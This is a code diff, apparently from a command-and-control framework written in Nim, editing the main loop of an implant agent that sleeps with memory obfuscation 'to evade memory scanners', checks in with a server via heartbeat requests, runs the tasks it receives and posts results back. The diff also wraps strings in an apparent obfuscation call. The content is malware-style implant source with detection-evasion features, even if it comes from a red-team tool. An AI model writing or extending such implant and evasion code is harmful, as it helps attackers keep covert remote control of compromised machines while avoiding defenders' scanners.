@@ -1,6 +1,7 @@
 import strformat, os, times, system, base64, random
 
-import core/[http, context, sleepmask, io]
+import core/[http, context, sleepmask]
+import utils/io
 import protocol/[task, result, heartbeat, registration]
 import ../common/[types, utils, crypto]
 
@@ -24,21 +25,21 @@ proc main() =
     #[
         Agent routine: 
         1. Sleep Obfuscation
-        2. Retrieve task from /tasks endpoint
-        3. Execute task and post result to /results
-        4. If additional tasks have been fetched, go to 2.
+        2. Retrieve tasks via checkin request to a GET endpoint
+        3. Execute task and post result
+        4. If additional tasks have been fetched, go to 3.
         5. If no more tasks need to be executed, go to 1. 
     ]#
     while true: 
         # Sleep obfuscation to evade memory scanners
         sleepObfuscate(ctx.sleepSettings)
 
-        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
+        let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
         print "\n", fmt"[*] [{date}] Checking in."
 
         try: 
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
-            # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
+            # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
             var heartbeat: Heartbeat = ctx.createHeartbeat()
             let 
                 heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
